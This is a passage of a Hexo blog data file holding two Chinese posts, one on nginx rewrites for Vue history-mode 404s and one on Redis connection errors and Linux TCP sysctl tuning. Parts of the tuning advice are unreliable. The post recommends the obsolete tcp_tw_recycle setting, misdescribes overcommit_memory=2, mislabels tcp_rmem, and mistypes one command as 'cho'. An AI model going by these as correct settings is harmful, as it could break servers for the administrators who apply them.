解决\n\n刷新页面时访问的资源在服务端找不到，因为此时vue-router设置路由地址被当作url地址，此时的地址路径不是真实存在的，所以出现404现象\n\n在服务端nginx配置里添加vue-route的跳转设置（这里首页是index.html，如果是index.php就在下面对应位置替换），配置如下：\n\n```\nserver\n{\n    listen 80;\n    server_name www.test.com;\n    index index.php index.html index.htm default.php default.htm default.html;\n    root /www/wwwroot/test/dist;\n\n    #vue-router配置\n    location / {\n        try_files $uri $uri/ @router;\n        index index.html;\n    }\n    location @router {\n        rewrite ^.*$ /index.html last;\n    }\n}\n```\n\n重启 nginx 后，页面可以正常访问","source":"_posts/2019/11/服务部署Vue项目后出现 404 问题.md","raw":"---\nlayout: post\ntitle: 'Nginx 服务部署 Vue 项目后,出现 404 问题'\ntags:\n  - vue\ncategories:\n  - vue\nabbrlink: 59640\n---\n\n### 前言\n\n在本地与部署线上环境后都没有问题，使用‘history’路由模式，部署线上环境后，首页能正常访问，点击其他页面，出现 404 Not Found\n\n<!--more-->\n\n### 解决\n\n刷新页面时访问的资源在服务端找不到，因为此时vue-router设置路由地址被当作url地址，此时的地址路径不是真实存在的，所以出现404现象\n\n在服务端nginx配置里添加vue-route的跳转设置（这里首页是index.html，如果是index.php就在下面对应位置替换），配置如下：\n\n```\nserver\n{\n    listen 80;\n    server_name www.test.com;\n    index index.php index.html index.htm default.php default.htm default.html;\n    root /www/wwwroot/test/dist;\n\n    #vue-router配置\n    location / {\n        try_files $uri $uri/ @router;\n        index index.html;\n    }\n    location @router {\n        rewrite ^.*$ /index.html last;\n    }\n}\n```\n\n重启 nginx 后，页面可以正常访问","slug":"2019/11/服务部署Vue项目后出现 404 问题","published":1,"date":"2019-11-01T11:03:47.355Z","updated":"2020-04-12T06:34:43.617Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzd000944vqw6zs7e1n","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>在本地与部署线上环境后都没有问题，使用‘history’路由模式，部署线上环境后，首页能正常访问，点击其他页面，出现 404 Not Found</p>\n<a id=\"more\"></a>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>刷新页面时访问的资源在服务端找不到，因为此时vue-router设置路由地址被当作url地址，此时的地址路径不是真实存在的，所以出现404现象</p>\n<p>在服务端nginx配置里添加vue-route的跳转设置（这里首页是index.html，如果是index.php就在下面对应位置替换），配置如下：</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> <span class=\"number\">80</span>;</span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> www.test.com;</span><br><span class=\"line\">    <span class=\"attribute\">index</span> index.php index.html index.htm default.php default.htm default.html;</span><br><span class=\"line\">    <span class=\"attribute\">root</span> /www/wwwroot/test/dist;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#vue-router配置</span></span><br><span class=\"line\">    <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">try_files</span> <span class=\"variable\">$uri</span> <span class=\"variable\">$uri</span>/ <span class=\"variable\">@router</span>;</span><br><span class=\"line\">        <span class=\"attribute\">index</span> index.html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"attribute\">location</span> <span class=\"variable\">@router</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^.*$</span> /index.html <span class=\"literal\">last</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>重启 nginx 后，页面可以正常访问</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>在本地与部署线上环境后都没有问题，使用‘history’路由模式，部署线上环境后，首页能正常访问，点击其他页面，出现 404 Not Found</p>","more":"<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>刷新页面时访问的资源在服务端找不到，因为此时vue-router设置路由地址被当作url地址，此时的地址路径不是真实存在的，所以出现404现象</p>\n<p>在服务端nginx配置里添加vue-route的跳转设置（这里首页是index.html，如果是index.php就在下面对应位置替换），配置如下：</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> <span class=\"number\">80</span>;</span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> www.test.com;</span><br><span class=\"line\">    <span class=\"attribute\">index</span> index.php index.html index.htm default.php default.htm default.html;</span><br><span class=\"line\">    <span class=\"attribute\">root</span> /www/wwwroot/test/dist;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#vue-router配置</span></span><br><span class=\"line\">    <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">try_files</span> <span class=\"variable\">$uri</span> <span class=\"variable\">$uri</span>/ <span class=\"variable\">@router</span>;</span><br><span class=\"line\">        <span class=\"attribute\">index</span> index.html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"attribute\">location</span> <span class=\"variable\">@router</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^.*$</span> /index.html <span class=\"literal\">last</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>重启 nginx 后，页面可以正常访问</p>"},{"layout":"post","title":"Redis由于连接过多导致的异常","abbrlink":16422,"_content":"\n### 前言\n\n近期服务器在高峰的时候经常报错，日志记录为：\n\n```log\nRedis->connect('127.0.0.1', 6379)\n#1 {main}\n  thrown in /wwwroot/test.php on line 9\n[13-Jun-2019 11:07:47 PRC] PHP Fatal error:  Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9\n```\n<!--more-->\n\n### 解决方法\n\n#### 方法一\n\n执行命令修改如下 2 个内核参数  \n\n```sh\nsysctl -w net.ipv4.tcp_timestamps=1 开启对于 TCP 时间戳的支持, 若该项设置为 0，则下面一项设置不起作用\n\nsysctl -w net.ipv4.tcp_tw_recycle=1 表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收\n\nRedis 错误 ：Cannot assign request\n\nCould not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request\n```\n\n经查官方 Wiki 是系统网络配置问题已经解决：\n\n```sh\necho 1 > /proc/sys/net/ipv4/tcp_tw_reuse\n```\n\n以上需要 root 权限对网络进行配置。\n\n#### 方法二\n\n通过调整内核参数解决，`vim /etc/sysctl.conf`，加入\n\n```conf\nnet.ipv4.tcp_syncookies = 1 #表示开启 SYN Cookies。当出现 SYN 等待队列溢出时，启用 cookies 来处理，可防范少量 SYN 攻击，默认为 0，表示关闭；\n\nnet.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将 TIME-WAIT sockets 重新用于新的 TCP 连接，默认为 0，表示关闭，释放 TIME_WAIT 端口给新连接使用；\n\nnet.ipv4.tcp_tw_recycle = 1 #表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收资源，默认为 0，表示关闭。\n\nnet.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间，调低端口释放后的等待时间，默认为 60s，修改为 15~30s\n\nnet.ipv4.tcp_max_tw_buckets = 10000# 通过设置它，系统会将多余的 TIME_WAIT 删除掉，此时系统日志里可能会显示：『TCP: time wait bucket table overflow』，多数情况下不用在意这些信息。\n```\n\n然后执行 `/sbin/sysctl -p` 让参数生效。\n\n以上都可以通过命令（sysctl -w）方式操作，如：`sysctl -w net.ipv4.tcp_fin_timeout=30` ，只适合临时修改参数。\n\n### TCP 网络参数优化\n\n```sh\necho \"1024 65535\" > /proc/sys/net/ipv4/ip_local_port_range 设置向外连接可用端口范围 表示可以使用的端口为 65535-1024 个（0~1024 为受保护的)\n\necho 1 > /proc/sys/net/ipv4/tcp_tw_reuse 设置 time_wait 连接重用 默认 0\n\necho 1 > /proc/sys/net/ipv4/tcp_tw_recycle 设置快速回收 time_wait 连接 默认 0\n\necho 180000 > /proc/sys/net/ipv4/tcp_max_tw_buckets 设置最大 time_wait 连接长度 默认 262144\n\necho 1 > /proc/sys/net/ipv4/tcp_timestamps  设置是否启用比超时重发更精确的方法来启用对 RTT 的计算 默认 0\n\necho 1 > /proc/sys/net/ipv4/tcp_window_scaling 设置 TCP/IP 会话的滑动窗口大小是否可变 默认 1\n\necho 20000 > /proc/sys/net/ipv4/tcp_max_syn_backlog 设置最大处于等待客户端没有应答的连接数 默认 2048\n\necho 15 > /proc/sys/net/ipv4/tcp_fin_timeout  设置 FIN-WAIT 状态等待回收时间 默认 60\n\necho \"4096 87380 16777216\" > /proc/sys/net/ipv4/tcp_rmem  设置最大 TCP 数据发送缓冲大小，分别为最小、默认和最大值  默认 4096    87380   4194304\n\necho \"4096 65536 16777216\" > /proc/sys/net/ipv4/tcp_wmem 设置最大 TCP 数据 接受缓冲大小，分别为最小、默认和最大值 　默认 4096    87380   4194304\n\necho 10000 > /proc/sys/net/core/somaxconn  设置每一个处于监听状态的端口的监听队列的长度 默认 128\n\necho 10000 > /proc/sys/net/core/netdev_max_backlog 设置最大等待 cpu 处理的包的数目 默认 1000\n\necho 16777216 > /proc/sys/net/core/rmem_max 设置最大的系统套接字数据接受缓冲大小 默认 124928\n\necho 262144 > /proc/sys/net/core/rmem_default  设置默认的系统套接字数据接受缓冲大小 默认 124928\n\necho 16777216 > /proc/sys/net/core/wmem_max  设置最大的系统套接字数据发送缓冲大小 默认 124928\n\necho 262144 > /proc/sys/net/core/wmem_default  设置默认的系统套接字数据发送缓冲大小 默认 124928\n\necho 2000000 > /proc/sys/fs/file-max 设置最大打开文件数 默认 385583\n```\n\n结合 ab 命令来压测机器优化网络，设置完记得保存\n\n### 优化 Redis 命令\n\n设置内存分配方式：\n\n```\necho 1 > /proc/sys/vm/overcommit_memory\n```\n\n0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。\n\n1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。\n\n2 表示内核允许分配超过所有物理内存和交换空间总和的内存\n\n关闭 THP：\n\n```\ncho never > /sys/kernel/mm/transparent_hugepage/enabled\n```\n\n尽管 THP 的本意是为提升性能，但某些数据库厂商还是建议直接关闭 THP(比如说 Oracle、MongoDB 等)，否则可能导致性能下降，内存锁，甚至系统重启等问题。\n\n```\necho 1024 >/proc/sys/net/core/somaxconn\n```\n\n限制了接收新 TCP 连接侦听队列的大小。对于一个经常处理新连接的高负载 web 服务环境来说，默认的 128 太小了。大多数环境这个值建议增加到 1024 或者更多。 服务进程会自己限制侦听队列的大小 (例如 sendmail(8) 或者 Apache)，常常在它们的配置文件中有设置队列大小的选项。大的侦听队列对防止拒绝服务 DoS 攻击也会有所帮助。","source":"_posts/2019/12/Redis由于连接过多导致的异常.md","raw":"---\nlayout: post\ntitle: Redis由于连接过多导致的异常\ntags:\n  - redis\ncategories:\n  - redis\nabbrlink: 16422\n---\n\n### 前言\n\n近期服务器在高峰的时候经常报错，日志记录为：\n\n```log\nRedis->connect('127.0.0.1', 6379)\n#1 {main}\n  thrown in /wwwroot/test.php on line 9\n[13-Jun-2019 11:07:47 PRC] PHP Fatal error:  Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9\n```\n<!--more-->\n\n### 解决方法\n\n#### 方法一\n\n执行命令修改如下 2 个内核参数  \n\n```sh\nsysctl -w net.ipv4.tcp_timestamps=1 开启对于 TCP 时间戳的支持, 若该项设置为 0，则下面一项设置不起作用\n\nsysctl -w net.ipv4.tcp_tw_recycle=1 表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收\n\nRedis 错误 ：Cannot assign request\n\nCould not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request\n```\n\n经查官方 Wiki 是系统网络配置问题已经解决：\n\n```sh\necho 1 > /proc/sys/net/ipv4/tcp_tw_reuse\n```\n\n以上需要 root 权限对网络进行配置。\n\n#### 方法二\n\n通过调整内核参数解决，`vim /etc/sysctl.conf`，加入\n\n```conf\nnet.ipv4.tcp_syncookies = 1 #表示开启 SYN Cookies。当出现 SYN 等待队列溢出时，启用 cookies 来处理，可防范少量 SYN 攻击，默认为 0，表示关闭；\n\nnet.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将 TIME-WAIT sockets 重新用于新的 TCP 连接，默认为 0，表示关闭，释放 TIME_WAIT 端口给新连接使用；\n\nnet.ipv4.tcp_tw_recycle = 1 #表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收资源，默认为 0，表示关闭。\n\nnet.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间，调低端口释放后的等待时间，默认为 60s，修改为 15~30s\n\nnet.ipv4.tcp_max_tw_buckets = 10000# 通过设置它，系统会将多余的 TIME_WAIT 删除掉，此时系统日志里可能会显示：『TCP: time wait bucket table overflow』，多数情况下不用在意这些信息。\n```\n\n然后执行 `/sbin/sysctl -p` 让参数生效。\n\n以上都可以通过命令（sysctl -w）方式操作，如：`sysctl -w net.ipv4.tcp_fin_timeout=30` ，只适合临时修改参数。\n\n### TCP 网络参数优化\n\n```sh\necho \"1024 65535\" > /proc/sys/net/ipv4/ip_local_port_range 设置向外连接可用端口范围 表示可以使用的端口为 65535-1024 个（0~1024 为受保护的)\n\necho 1 > /proc/sys/net/ipv4/tcp_tw_reuse 设置 time_wait 连接重用 默认 0\n\necho 1 > /proc/sys/net/ipv4/tcp_tw_recycle 设置快速回收 time_wait 连接 默认 0\n\necho 180000 > /proc/sys/net/ipv4/tcp_max_tw_buckets 设置最大 time_wait 连接长度 默认 262144\n\necho 1 > /proc/sys/net/ipv4/tcp_timestamps  设置是否启用比超时重发更精确的方法来启用对 RTT 的计算 默认 0\n\necho 1 > /proc/sys/net/ipv4/tcp_window_scaling 设置 TCP/IP 会话的滑动窗口大小是否可变 默认 1\n\necho 20000 > /proc/sys/net/ipv4/tcp_max_syn_backlog 设置最大处于等待客户端没有应答的连接数 默认 2048\n\necho 15 > /proc/sys/net/ipv4/tcp_fin_timeout  设置 FIN-WAIT 状态等待回收时间 默认 60\n\necho \"4096 87380 16777216\" > /proc/sys/net/ipv4/tcp_rmem  设置最大 TCP 数据发送缓冲大小，分别为最小、默认和最大值  默认 4096    87380   4194304\n\necho \"4096 65536 16777216\" > /proc/sys/net/ipv4/tcp_wmem 设置最大 TCP 数据 接受缓冲大小，分别为最小、默认和最大值 　默认 4096    87380   4194304\n\necho 10000 > /proc/sys/net/core/somaxconn  设置每一个处于监听状态的端口的监听队列的长度 默认 128\n\necho 10000 > /proc/sys/net/core/netdev_max_backlog 设置最大等待 cpu 处理的包的数目 默认 1000\n\necho 16777216 > /proc/sys/net/core/rmem_max 设置最大的系统套接字数据接受缓冲大小 默认 124928\n\necho 262144 > /proc/sys/net/core/rmem_default  设置默认的系统套接字数据接受缓冲大小 默认 124928\n\necho 16777216 > /proc/sys/net/core/wmem_max  设置最大的系统套接字数据发送缓冲大小 默认 124928\n\necho 262144 > /proc/sys/net/core/wmem_default  设置默认的系统套接字数据发送缓冲大小 默认 124928\n\necho 2000000 > /proc/sys/fs/file-max 设置最大打开文件数 默认 385583\n```\n\n结合 ab 命令来压测机器优化网络，设置完记得保存\n\n### 优化 Redis 命令\n\n设置内存分配方式：\n\n```\necho 1 > /proc/sys/vm/overcommit_memory\n```\n\n0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。\n\n1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。\n\n2 表示内核允许分配超过所有物理内存和交换空间总和的内存\n\n关闭 THP：\n\n```\ncho never > /sys/kernel/mm/transparent_hugepage/enabled\n```\n\n尽管 THP 的本意是为提升性能，但某些数据库厂商还是建议直接关闭 THP(比如说 Oracle、MongoDB 等)，否则可能导致性能下降，内存锁，甚至系统重启等问题。\n\n```\necho 1024 >/proc/sys/net/core/somaxconn\n```\n\n限制了接收新 TCP 连接侦听队列的大小。对于一个经常处理新连接的高负载 web 服务环境来说，默认的 128 太小了。大多数环境这个值建议增加到 1024 或者更多。 服务进程会自己限制侦听队列的大小 (例如 sendmail(8) 或者 Apache)，常常在它们的配置文件中有设置队列大小的选项。大的侦听队列对防止拒绝服务 DoS 攻击也会有所帮助。","slug":"2019/12/Redis由于连接过多导致的异常","published":1,"date":"2019-12-16T08:42:04.870Z","updated":"2020-04-12T06:34:43.618Z","comments":1,"photos":[],"link":"","_id":"ck9z76vze000a44vqtcu2xjd5","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>近期服务器在高峰的时候经常报错，日志记录为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Redis-&gt;connect(&apos;127.0.0.1&apos;, 6379)</span><br><span class=\"line\">#1 &#123;main&#125;</span><br><span class=\"line\">  thrown in /wwwroot/test.php on line 9</span><br><span class=\"line\">[13-Jun-2019 11:07:47 PRC] PHP Fatal error:  Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h3><h4 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h4><p>执行命令修改如下 2 个内核参数  </p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sysctl -w net.ipv4.tcp_timestamps=1 开启对于 TCP 时间戳的支持, 若该项设置为 0，则下面一项设置不起作用</span><br><span class=\"line\"></span><br><span class=\"line\">sysctl -w net.ipv4.tcp_tw_recycle=1 表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收</span><br><span class=\"line\"></span><br><span class=\"line\">Redis 错误 ：Cannot assign request</span><br><span class=\"line\"></span><br><span class=\"line\">Could not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request</span><br></pre></td></tr></table></figure>\n<p>经查官方 Wiki 是系统网络配置问题已经解决：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse</span><br></pre></td></tr></table></figure>\n<p>以上需要 root 权限对网络进行配置。</p>\n<h4 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h4><p>通过调整内核参数解决，<code>vim /etc/sysctl.conf</code>，加入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net.ipv4.tcp_syncookies = 1 #表示开启 SYN Cookies。当出现 SYN 等待队列溢出时，启用 cookies 来处理，可防范少量 SYN 攻击，默认为 0，表示关闭；</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将 TIME-WAIT sockets 重新用于新的 TCP 连接，默认为 0，表示关闭，释放 TIME_WAIT 端口给新连接使用；</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_tw_recycle = 1 #表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收资源，默认为 0，表示关闭。</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间，调低端口释放后的等待时间，默认为 60s，修改为 15~30s</span><br><span class=\"line\"></span><br><span class=\"line\">net.ipv4.tcp_max_tw_buckets = 10000# 通过设置它，系统会将多余的 TIME_WAIT 删除掉，此时系统日志里可能会显示：『TCP: time wait bucket table overflow』，多数情况下不用在意这些信息。</span><br></pre></td></tr></table></figure>\n<p>然后执行 <code>/sbin/sysctl -p</code> 让参数生效。</p>\n<p>以上都可以通过命令（sysctl -w）方式操作，如：<code>sysctl -w net.ipv4.tcp_fin_timeout=30</code> ，只适合临时修改参数。</p>\n<h3 id=\"TCP-网络参数优化\"><a href=\"#TCP-网络参数优化\" class=\"headerlink\" title=\"TCP 网络参数优化\"></a>TCP 网络参数优化</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"1024 65535\"</span> &gt; /proc/sys/net/ipv4/ip_local_port_range 设置向外连接可用端口范围 表示可以使用的端口为 65535-1024 个（0~1024 为受保护的)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse 设置 time_wait 连接重用 默认 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_recycle 设置快速回收 time_wait 连接 默认 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 180000 &gt; /proc/sys/net/ipv4/tcp_max_tw_buckets 设置最大 time_wait 连接长度 默认 262144</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_timestamps  设置是否启用比超时重发更精确的方法来启用对 RTT 的计算 默认 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_window_scaling 设置 TCP/IP 会话的滑动窗口大小是否可变 默认 1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 20000 &gt; /proc/sys/net/ipv4/tcp_max_syn_backlog 设置最大处于等待客户端没有应答的连接数 默认 2048</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 15 &gt; /proc/sys/net/ipv4/tcp_fin_timeout  设置 FIN-WAIT 状态等待回收时间 默认 60</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"4096 87380 16777216\"</span> &gt; /proc/sys/net/ipv4/tcp_rmem  设置最大 TCP 数据发送缓冲大小，分别为最小、默认和最大值  默认 4096    87380   4194304</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"4096 65536 16777216\"</span> &gt; /proc/sys/net/ipv4/tcp_wmem 设置最大 TCP 数据 接受缓冲大小，分别为最小、默认和最大值 　默认 4096    87380   4194304</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 10000 &gt; /proc/sys/net/core/somaxconn  设置每一个处于监听状态的端口的监听队列的长度 默认 128</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 10000 &gt; /proc/sys/net/core/netdev_max_backlog 设置最大等待 cpu 处理的包的数目 默认 1000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 16777216 &gt; /proc/sys/net/core/rmem_max 设置最大的系统套接字数据接受缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 262144 &gt; /proc/sys/net/core/rmem_default  设置默认的系统套接字数据接受缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 16777216 &gt; /proc/sys/net/core/wmem_max  设置最大的系统套接字数据发送缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 262144 &gt; /proc/sys/net/core/wmem_default  设置默认的系统套接字数据发送缓冲大小 默认 124928</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 2000000 &gt; /proc/sys/fs/file-max 设置最大打开文件数 默认 385583</span><br></pre></td></tr></table></figure>\n<p>结合 ab 命令来压测机器优化网络，设置完记得保存</p>\n<h3 id=\"优化-Redis-命令\"><a href=\"#优化-Redis-命令\" class=\"headerlink\" title=\"优化 Redis 命令\"></a>优化 Redis 命令</h3><p>设置内存分配方式：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo <span class=\"number\">1</span> &gt; <span class=\"regexp\">/proc/</span>sys<span class=\"regexp\">/vm/</span>overcommit_memory</span><br></pre></td></tr></table></figure>\n<p>0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。</p>\n<p>1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。</p>\n<p>2 表示内核允许分配超过所有物理内存和交换空间总和的内存</p>\n<p>关闭 THP：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cho never &gt; <span class=\"regexp\">/sys/</span>kernel<span class=\"regexp\">/mm/</span>transparent_hugepage<span class=\"regexp\">/enabled</span></span><br></pre></td></tr></table></figure>\n<p>尽管 THP 的本意是为提升性能，但某些数据库厂商还是建议直接关闭 THP(比如说 Oracle、MongoDB 等)，否则可能导致性能下降，内存锁，甚至系统重启等问题。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo <span class=\"number\">1024</span> &gt;<span class=\"regexp\">/proc/</span>sys<span class=\"regexp\">/net/</span>core<span class=\"regexp\">/somaxconn</span></span><br></pre></td></tr></table></figure>\n<p>限制了接收新 TCP 连接侦听队列的大小。对于一个经常处理新连接的高负载 web 服务环境来说，默认的 128 太小了。大多数环境这个值建议增加到 1024 或者更多。 服务进程会自己限制侦听队列的大小 (例如 sendmail(8) 或者 Apache)，常常在它们的配置文件中有设置队列大小的选项。大的侦听队列对防止拒绝服务 DoS 攻击也会有所帮助。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>近期服务器在高峰的时候经常报错，日志记录为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Redis-&gt;connect(&apos;127.0.0.1&apos;, 6379)</span><br><span class=\"line\">#1 &#123;main&#125;</span><br><span class=\"line\">  thrown in /wwwroot/test.php on line 9</span><br><span class=\"line\">[13-Jun-2019 11:07:47 PRC] PHP Fatal error:  Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h3><h4 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h4><p>执行命令修改如下 2 个内核参数  </p>\n<figure class=\"highlight sh\"><table><tr><td 